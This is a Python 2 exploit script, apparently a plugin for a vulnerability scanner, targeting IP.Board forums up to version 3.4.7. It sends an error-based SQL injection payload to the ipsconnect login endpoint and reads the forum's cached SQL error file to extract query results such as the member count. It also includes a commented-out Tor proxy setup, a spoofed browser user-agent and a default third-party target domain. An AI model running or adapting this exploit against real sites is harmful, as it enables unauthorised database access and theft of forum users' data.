#!/usr/bin/env python 
# Sunday, November 09, 2014 - secthrowaway () safe-mail net 
# IP.Board <= 3.4.7 SQLi (blind, error based); 
# you can adapt to other types of blind injection if 'cache/sql_error_latest.cgi' is unreadable 

# <socks> - http://sourceforge.net/projects/socksipy/ 
#import socks, socket 
#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050) 
#socket.socket = socks.socksocket 
# </socks> 

import sys, re 
import urllib2, urllib 

from dummy import *

info = {
	'NAME':'IP.Board <= 3.4.7 SQL Injection',
	'AUTHOR':'Secthrowaway,yangbh',
	'TIME':'20141111',
	'WEB':'https://www.marshut.net/krtqnk/ip-board-3-4-7-sql-injection.html',
	'DESCRIPTION':''
}
opts = [
	['url','http://testasp.vulnweb.com','target url']
]
# ----------------------------------------------------------------------------------------------------
#
# ----------------------------------------------------------------------------------------------------
def inject(sql,url,ua): 
	try: 
		urllib2.urlopen(urllib2.Request('%sinterface/ipsconnect/ipsconnect.php' % url, data="act=login&idType=id&id[]=-1&id[]=%s" % urllib.quote('-1) and 1!="\'" and extractvalue(1,concat(0x3a,(%s)))#\'' % sql), headers={"User-agent": ua})) 
	except urllib2.HTTPError, e: 
		if e.code == 503: 
			data = urllib2.urlopen(urllib2.Request('%scache/sql_error_latest.cgi' % url, headers={"User-agent": ua})).read() 
			# return data
			txt = re.search("XPATH syntax error: ':(.*)'", data, re.MULTILINE) 
			if txt is not None: 
				return txt.group(1)
	except Exception,e:
		pass
			# sys.exit('Error [3], received unexpected data:\n%s' % data) 
		# sys.exit('Error [1]') 
	# sys.exit('Error [2]') 

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'IP.Board':
			if (services.has_key('cmsversion') and services['cmsversion']<='3.4.7') or services.has_key('cmsversion')==False:
				return True
	return False

def Audit(services):
	url = services['url'] + '/forum/'
	ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" 
	n = inject('SELECT COUNT(*) FROM members',url,ua) 
	if n:
		security_note(n)
# ----------------------------------------------------------------------------------------------------
#
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	url='http://rapstrike.com'
	if len(sys.argv) ==  2:
		url = sys.argv[1]
	services = {'url':url,'cms':'IP.Board'}
	pprint(Audit(services))
